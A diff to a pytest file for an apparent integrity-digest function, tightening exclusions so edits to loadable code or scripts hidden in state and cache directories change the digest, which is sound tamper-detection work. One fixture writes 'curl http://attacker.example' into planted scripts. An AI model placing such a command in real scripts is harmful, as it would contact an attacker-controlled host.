@@ -81,14 +81,14 @@ class TestTreeDigest:
         a, b = _component(tmp_path / "a"), _component(tmp_path / "b")
         assert core.tree_digest(a) == core.tree_digest(b)
 
-    @pytest.mark.parametrize("junk", ["run.log", "cached.pyc", "scratch.tmp", "x.pyo"])
+    @pytest.mark.parametrize("junk", ["run.log", "scratch.tmp"])
     def test_run_artifacts_are_excluded(self, tmp_path, junk):
         root = _component(tmp_path)
         before = core.tree_digest(root)
         (root / junk).write_text("noise", encoding="utf-8")
         assert core.tree_digest(root) == before
 
-    @pytest.mark.parametrize("directory", ["state", ".cache", "__pycache__", "node_modules"])
+    @pytest.mark.parametrize("directory", ["state", ".cache"])
     def test_state_directories_are_excluded(self, tmp_path, directory):
         root = _component(tmp_path)
         (root / directory).mkdir()
@@ -104,6 +104,42 @@ class TestTreeDigest:
         (nested / "cursor").write_text("42", encoding="utf-8")
         assert core.tree_digest(root) == before
 
+    @pytest.mark.parametrize("relative", [
+        "node_modules/helper/index.js",
+        "node_modules/helper/package.json",
+        "scripts/__pycache__/run.cpython-312.pyc",
+        "scripts/helper.pyc",
+        "x.pyo",
+    ])
+    def test_loadable_code_is_not_excluded(self, tmp_path, relative):
+        """The runtime loads these, so an edit to one is a behaviour change."""
+        root = _component(tmp_path)
+        target = root / relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_bytes(b"approved")
+        before = core.tree_digest(root)
+        target.write_bytes(b"payload")
+        assert core.tree_digest(root) != before
+
+    @pytest.mark.parametrize("relative", ["state/run.py", ".cache/hook.sh", "state/tool.js", "notes.log.py"])
+    def test_executable_inside_an_exclusion_is_digested(self, tmp_path, relative):
+        """Exclusions cover data a component writes, not a script dropped beside it."""
+        root = _component(tmp_path)
+        before = core.tree_digest(root)
+        target = root / relative
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text("curl http://attacker.example\n", encoding="utf-8")
+        assert core.tree_digest(root) != before
+
+    def test_tree_without_newly_digested_files_keeps_its_digest(self, tmp_path):
+        """Narrowing the exclusions must not move the digest of a skill that has
+        none of the newly covered files, or every existing baseline would drift."""
+        root = _component(tmp_path)
+        (root / "state").mkdir()
+        (root / "state" / "progress.json").write_text("{}", encoding="utf-8")
+        (root / "run.log").write_text("x", encoding="utf-8")
+        assert core.tree_digest(root) == core.tree_digest(_component(tmp_path / "clean"))
+
     def test_empty_or_missing_tree_is_none_not_a_digest_of_nothing(self, tmp_path):
         """None distinguishes "no component here" from "a component with no files",
         so a caller does not record a fingerprint for something absent."""
@@ -116,6 +152,8 @@ class TestTreeDigest:
         gets measured. The denylist lives in this package."""
         assert "state" in core.EXCLUDE_DIRS
         assert ".log" in core.EXCLUDE_SUFFIXES
+        assert not {"node_modules", "__pycache__"} & core.EXCLUDE_DIRS
+        assert not {".pyc", ".pyo"} & core.EXCLUDE_SUFFIXES
 
 
 # ---------------------------------------------------------------------------
